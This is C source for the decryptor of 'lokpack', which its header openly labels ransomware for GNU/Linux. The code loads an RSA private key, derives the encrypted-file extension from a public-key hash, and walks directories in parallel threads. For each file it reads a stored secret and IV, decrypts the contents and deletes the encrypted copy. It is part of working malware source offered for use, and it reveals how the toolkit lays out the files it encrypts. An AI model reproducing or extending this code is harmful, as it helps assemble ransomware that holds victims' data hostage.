/*

 * lokpack | ransomware for GNU/Linux
 * written by ngn (https://ngn.tf) (2025)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

#include "lib/traverse.h"
#include "lib/config.h"
#include "lib/util.h"
#include "lib/rsa.h"
#include "lib/log.h"

#include <openssl/evp.h>
#include <sys/stat.h>

#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#include <fcntl.h>
#include <stdio.h>

/* shared handler data */
lp_traverser_t trav;

EVP_PKEY *priv_key   = NULL;
char      pub_ext[7] = {0};

int quit(int code) {
  /* free resources */
  lp_traverser_free(&trav);
  lp_rsa_key_free(priv_key);

  /* exit (should never return) */
  exit(code);
  return code;
}

void signal_handler(int signal) {
  (void)signal; /* unused */

  lp_info("Stopping the program, wait for ongoing operations");
  quit(EXIT_FAILURE);
}

void decrypt_handler(char *path) {
  bool        ret = false;
  lp_rsa_t    rsa;
  struct stat st;

  /* input file */
  int     in = -1, in_len = 0, in_file_len = strlen(path);
  uint8_t in_buf[LP_RSA_BLOCK_SIZE];
  char   *in_file = path;

  /* output file */
  int     out = -1, out_len = 0, out_file_len = in_file_len - sizeof(pub_ext);
  uint8_t out_buf[LP_RSA_BLOCK_SIZE];
  char   *out_file = calloc(1, out_file_len + 1);

  /* initialize RSA structure with the private key */
  lp_rsa_init(&rsa, priv_key);

  /* output file name */
  memcpy(out_file, in_file, out_file_len);

  /* open the input file */
  if ((in = open(in_file, O_RDONLY)) < 0) {
    lp_debug("Failed to open input file %s: %s", in_file, lp_str_error());
    goto free;
  }

  /* open the output file */
  if ((out = open(out_file, O_RDWR | O_CREAT, 0600)) < 0) {
    lp_debug("Failed to open output file %s: %s", out_file, lp_str_error());
    goto free;
  }

  /* read the secret and the IV */
  if (read(in, rsa.secret, sizeof(rsa.secret)) <= 0) {
    lp_debug("Failed to read the secret from %s: %s", in_file, lp_str_error());
    goto free;
  }

  if (read(in, rsa.iv, sizeof(rsa.iv)) <= 0) {
    lp_debug("Failed to read the IV from %s: %s", in_file, lp_str_error());
    goto free;
  }

  /* load the RSA decryption context */
  if (!lp_rsa_load(&rsa)) {
    lp_debug("Failed to load the RSA context");
    goto free;
  }

  /* read from the input file, one block at a time */
  while ((in_len = read(in, in_buf, sizeof(in_buf))) > 0) {
    /* decrypt the full/partial block */
    if (!lp_rsa_decrypt(&rsa, in_buf, in_len, out_buf, &out_len)) {
      lp_debug("Failed to decrypt %s (%lu, %lu)", in_file, in_len, out_len);
      goto free;
    }

    /* write the decrypted full block to the output file */
    if (out_len != 0 && write(out, out_buf, out_len) <= 0) {
      lp_debug("Failed to write output to %s: %s", out_file, lp_str_error());
      goto free;
    }

    /* check if we read the last block */
    if (in_len < (int)sizeof(in_buf))
      break;
  }

  /* decrypt and write any leftover partial block */
  if (!lp_rsa_done(&rsa, out_buf, &out_len)) {
    lp_debug("Failed to decrypt the last block");
    goto free;
  }

  if (write(out, out_buf, out_len) < 0) {
    lp_debug("Failed to write last block to %s: %s", out_file, lp_str_error());
    goto free;
  }

  /* get and copy the file info */
  if (fstat(in, &st) < 0) {
    lp_debug("Failed to get stat of file: %s", in_file);
    goto free;
  }

  if (!lp_copy_stat(out, &st)) {
    lp_debug("Failed to copy perms from %s to %s", out_file, in_file);
    goto free;
  }

  /* remove the input file */
  if (unlink(in_file) < 0) {
    lp_debug("Failed to unlink input file: %s", in_file);
    goto free;
  }

  ret = true;

free:
  if (in >= 0)
    close(in);

  if (out >= 0)
    close(out);

  if (!ret) {
    lp_fail("Failed to decrypt %s", in_file);
    unlink(out_file);
  }

  free(in_file);
  free(out_file);
  lp_rsa_free(&rsa);
}

int main(int argc, char *argv[]) {
  /* signal action */
  struct sigaction action;

  char hash[LP_SHA256_SIZE], *exts[2];
  int  i;

  if (argc <= 1) {
    lp_info("Usage: %s [DIR/FILE]...", argv[0]);
    return EXIT_SUCCESS;
  }

  /* initialize the traverser */
  lp_traverser_init(&trav);

  /* setup the signal handler */
  sigemptyset(&action.sa_mask);
  action.sa_handler = signal_handler;
  action.sa_flags   = 0;

  sigaction(SIGINT, &action, NULL);
  sigaction(SIGTERM, &action, NULL);
  sigaction(SIGQUIT, &action, NULL);

  /* load the private RSA key */
  if (NULL == (priv_key = lp_rsa_key_load())) {
    lp_fail("Failed to load the private key, is the key valid?");
    quit(EXIT_FAILURE);
  }

  /* calculate the public key hash and the extension for the encrypted files */
  if (NULL == lp_sha256(LP_PUBKEY, hash)) {
    lp_fail("Failed to calculate hash of the public key");
    quit(EXIT_FAILURE);
  }

  if (snprintf(pub_ext, sizeof(pub_ext), "%.6s", hash) !=
      (int)sizeof(pub_ext) - 1) {
    lp_fail("Failed to format the encrypted file extension");
    quit(EXIT_FAILURE);
  }

  /* setup the traverser */
  exts[0] = pub_ext;
  exts[1] = NULL;

  if (!lp_traverser_setup(&trav, LP_THREADS, exts)) {
    lp_fail("Failed to create traverser: %s", lp_str_error());
    quit(EXIT_FAILURE);
  }

  lp_traverser_set_mode(&trav, R_OK | W_OK);
  lp_traverser_set_handler(&trav, decrypt_handler);

  /* traverse & decrypt all the specified dirs/files */
  for (i = 1; i < argc; i++) {
    lp_info("Decrypting %s", argv[i]);
    lp_traverser_run(&trav, argv[i]);
  }

  if (!lp_traverser_wait(&trav, true)) {
    lp_fail("Failed to wait for decryption threads: %s", lp_str_error());
    quit(EXIT_FAILURE);
  }

  lp_success("Operation completed");
  return quit(EXIT_SUCCESS);
}
